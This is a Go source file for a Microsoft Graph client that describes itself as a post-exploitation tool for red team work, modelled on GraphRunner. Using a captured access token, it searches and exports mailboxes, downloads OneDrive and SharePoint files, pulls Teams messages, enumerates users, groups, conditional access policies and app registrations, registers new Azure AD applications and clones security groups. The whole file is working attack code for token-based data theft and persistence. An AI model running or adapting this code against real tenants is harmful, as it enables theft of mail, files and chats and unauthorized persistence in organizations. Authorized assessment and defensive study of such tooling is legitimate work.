// Package graph provides a Microsoft Graph API client for post-exploitation
// operations during authorized red team assessments.
//
// Functionality mirrors GraphRunner (https://github.com/dafthack/GraphRunner):
// email search/export, OneDrive/SharePoint file search, Teams chat extraction,
// app deployment, mailbox discovery, group cloning, user attribute enumeration,
// conditional access policy dumping, and app registration auditing.
package graph

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const graphBase = "https://graph.microsoft.com/v1.0"

// Client wraps the Graph API with a captured Bearer token.
type Client struct {
	accessToken string
	httpClient  *http.Client
}

// New creates a Graph API client using the provided access token.
func New(accessToken string) *Client {
	return &Client{
		accessToken: accessToken,
		httpClient:  &http.Client{Timeout: 30 * time.Second},
	}
}

func (c *Client) get(ctx context.Context, path string) (json.RawMessage, error) {
	return c.request(ctx, "GET", graphBase+path, nil, nil)
}

func (c *Client) getWithHeader(ctx context.Context, path string, extraHeaders map[string]string) (json.RawMessage, error) {
	return c.request(ctx, "GET", graphBase+path, nil, extraHeaders)
}

func (c *Client) post(ctx context.Context, path string, payload interface{}) (json.RawMessage, error) {
	data, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	return c.request(ctx, "POST", graphBase+path, bytes.NewReader(data), map[string]string{"Content-Type": "application/json"})
}

func (c *Client) request(ctx context.Context, method, fullURL string, body io.Reader, extraHeaders map[string]string) (json.RawMessage, error) {
	req, err := http.NewRequestWithContext(ctx, method, fullURL, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+c.accessToken)
	req.Header.Set("Accept", "application/json")
	for k, v := range extraHeaders {
		req.Header.Set(k, v)
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("graph api %s %s → %d: %s", method, fullURL, resp.StatusCode, string(respBody))
	}
	return json.RawMessage(respBody), nil
}

// SearchEmails searches the user's mailbox for messages matching query.
// Returns raw Graph API response with message list.
func (c *Client) SearchEmails(ctx context.Context, query string, top int) (json.RawMessage, error) {
	if top <= 0 || top > 999 {
		top = 50
	}
	path := fmt.Sprintf("/me/messages?$search=%s&$top=%d",
		url.QueryEscape(`"`+query+`"`), top)
	return c.get(ctx, path)
}

// SearchOneDrive searches OneDrive and SharePoint files accessible to the user.
// If query is empty or "*", lists root children instead of searching.
func (c *Client) SearchOneDrive(ctx context.Context, query string, top int) (json.RawMessage, error) {
	if top <= 0 || top > 200 {
		top = 50
	}
	query = strings.TrimSpace(query)
	if query == "" || query == "*" {
		path := fmt.Sprintf("/me/drive/root/children?$top=%d", top)
		return c.get(ctx, path)
	}
	path := fmt.Sprintf("/me/drive/root/search(q='%s')?$top=%d", url.QueryEscape(query), top)
	return c.get(ctx, path)
}

// ListDriveFolder lists the children of a specific drive item by item ID.
// Use "root" as itemID to list the root folder.
func (c *Client) ListDriveFolder(ctx context.Context, itemID string, top int) (json.RawMessage, error) {
	if top <= 0 || top > 200 {
		top = 100
	}
	var path string
	if itemID == "" || itemID == "root" {
		path = fmt.Sprintf("/me/drive/root/children?$top=%d", top)
	} else {
		path = fmt.Sprintf("/me/drive/items/%s/children?$top=%d", itemID, top)
	}
	return c.get(ctx, path)
}

// GetDriveItemDownloadURL returns a pre-authenticated download URL for a file.
func (c *Client) GetDriveItemDownloadURL(ctx context.Context, itemID string) (string, error) {
	// Graph returns a 302 with Location header; we need to follow it to get the URL.
	req, err := http.NewRequestWithContext(ctx, "GET",
		fmt.Sprintf("https://graph.microsoft.com/v1.0/me/drive/items/%s/content", itemID), nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Bearer "+c.accessToken)

	// Don't follow redirects — we want the Location URL itself
	noRedirect := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := noRedirect.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	loc := resp.Header.Get("Location")
	if loc == "" {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("no redirect location (status %d): %s", resp.StatusCode, string(body))
	}
	return loc, nil
}

// DownloadDriveItem streams a file's content directly.
func (c *Client) DownloadDriveItem(ctx context.Context, itemID string) (io.ReadCloser, string, error) {
	downloadURL, err := c.GetDriveItemDownloadURL(ctx, itemID)
	if err != nil {
		return nil, "", err
	}
	req, err := http.NewRequestWithContext(ctx, "GET", downloadURL, nil)
	if err != nil {
		return nil, "", err
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, "", err
	}
	if resp.StatusCode >= 400 {
		resp.Body.Close()
		return nil, "", fmt.Errorf("download returned %d", resp.StatusCode)
	}
	contentDisp := resp.Header.Get("Content-Disposition")
	return resp.Body, contentDisp, nil
}

// GetTeamsChats returns all Teams chats visible to the user.
func (c *Client) GetTeamsChats(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/chats?$expand=members&$top=50")
}

// GetJoinedTeams returns all Teams the user is a member of.
func (c *Client) GetJoinedTeams(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/joinedTeams")
}

// GetTeamChannels returns channels for a specific team.
func (c *Client) GetTeamChannels(ctx context.Context, teamID string) (json.RawMessage, error) {
	return c.get(ctx, "/teams/"+teamID+"/channels")
}

// GetChannelMessages returns messages from a specific Teams channel.
func (c *Client) GetChannelMessages(ctx context.Context, teamID, channelID string) (json.RawMessage, error) {
	path := fmt.Sprintf("/teams/%s/channels/%s/messages?$top=50", teamID, channelID)
	return c.get(ctx, path)
}

// GetChatMessages returns messages from a direct/group chat.
func (c *Client) GetChatMessages(ctx context.Context, chatID string) (json.RawMessage, error) {
	return c.get(ctx, "/me/chats/"+chatID+"/messages?$top=50")
}

// DeployApp creates a new Azure AD application registration.
// Returns the created application object including appId.
func (c *Client) DeployApp(ctx context.Context, displayName, redirectURI string, requestedScopes []string) (json.RawMessage, error) {
	replyURIs := []string{}
	if redirectURI != "" {
		replyURIs = append(replyURIs, redirectURI)
	}
	payload := map[string]interface{}{
		"displayName":    displayName,
		"signInAudience": "AzureADMyOrg",
		"web": map[string]interface{}{
			"redirectUris":          replyURIs,
			"implicitGrantSettings": map[string]bool{"enableIdTokenIssuance": true},
		},
		"requiredResourceAccess": []interface{}{},
	}
	return c.post(ctx, "/applications", payload)
}

// DiscoverUsers lists all users in the tenant.
func (c *Client) DiscoverUsers(ctx context.Context) (json.RawMessage, error) {
	return c.getWithHeader(ctx,
		"/users?$top=999&$count=true",
		map[string]string{"ConsistencyLevel": "eventual"},
	)
}

// DiscoverMailboxes lists licensed member accounts.
func (c *Client) DiscoverMailboxes(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/users?$filter=userType eq 'Member'&$top=999")
}

// GetMailboxPermissions lists inbox rules for the current user (misconfiguration indicators).
func (c *Client) GetMailboxPermissions(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/mailFolders/inbox/messageRules")
}

// GetGroups lists all groups — both security and M365 groups.
func (c *Client) GetGroups(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/groups?$top=999")
}

// GetGroupMembers lists all members of a group.
func (c *Client) GetGroupMembers(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"/members?$top=999")
}

// GetOwnedGroups lists groups the current user can modify.
func (c *Client) GetOwnedGroups(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/ownedObjects?$top=999")
}

// GetMemberGroups lists groups the current user is a member of.
func (c *Client) GetMemberGroups(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/memberOf?$top=999")
}

// CloneGroup creates a copy of an existing security group.
func (c *Client) CloneGroup(ctx context.Context, sourceGroupID, newDisplayName, description string) (json.RawMessage, error) {
	// Fetch source group metadata
	sourceData, err := c.get(ctx, "/groups/"+sourceGroupID+"?$select=id,description,groupTypes,mailEnabled,securityEnabled,mailNickname")
	if err != nil {
		return nil, fmt.Errorf("fetching source group: %w", err)
	}
	var src struct {
		Description     string   `json:"description"`
		GroupTypes      []string `json:"groupTypes"`
		MailEnabled     bool     `json:"mailEnabled"`
		SecurityEnabled bool     `json:"securityEnabled"`
	}
	json.Unmarshal(sourceData, &src)

	if description == "" {
		description = src.Description
	}
	payload := map[string]interface{}{
		"displayName":     newDisplayName,
		"description":     description,
		"groupTypes":      src.GroupTypes,
		"mailEnabled":     src.MailEnabled,
		"securityEnabled": src.SecurityEnabled,
		"mailNickname":    strings.ToLower(strings.ReplaceAll(newDisplayName, " ", "-")),
	}
	return c.post(ctx, "/groups", payload)
}

// SearchUserAttributes searches across user attributes for a keyword.
func (c *Client) SearchUserAttributes(ctx context.Context, query string) (json.RawMessage, error) {
	q := fmt.Sprintf(`"displayName:%s" OR "mail:%s" OR "department:%s" OR "jobTitle:%s"`, query, query, query, query)
	path := fmt.Sprintf("/users?$search=%s&$top=50&$count=true", url.QueryEscape(q))
	return c.getWithHeader(ctx, path, map[string]string{"ConsistencyLevel": "eventual"})
}

// DumpConditionalAccessPolicies returns all conditional access policies.
// Requires Policy.Read.All permission (typically available to admins).
func (c *Client) DumpConditionalAccessPolicies(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/identity/conditionalAccess/policies")
}

// DumpAppRegistrations lists all app registrations in the tenant.
// Requires Application.Read.All permission.
func (c *Client) DumpAppRegistrations(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/applications?$top=999")
}

// DumpServicePrincipals lists all service principals (enterprise apps).
func (c *Client) DumpServicePrincipals(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/servicePrincipals?$top=999")
}

// GetOAuth2PermissionGrants returns delegated OAuth2 permission grants (consent records).
// Useful for identifying over-privileged consented apps.
func (c *Client) GetOAuth2PermissionGrants(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/oauth2PermissionGrants?$top=999")
}

// GetMyApps lists apps the current user has consented to.
func (c *Client) GetMyApps(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/appRoleAssignments")
}

// GetCurrentUser returns the current user's full profile.
func (c *Client) GetCurrentUser(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me")
}

// GetUserManager returns the current user's manager.
func (c *Client) GetUserManager(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/manager?$select=id,displayName,mail,userPrincipalName,jobTitle")
}

// GetUserDirectReports returns direct reports of the current user.
func (c *Client) GetUserDirectReports(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/directReports?$select=id,displayName,mail,userPrincipalName,jobTitle")
}
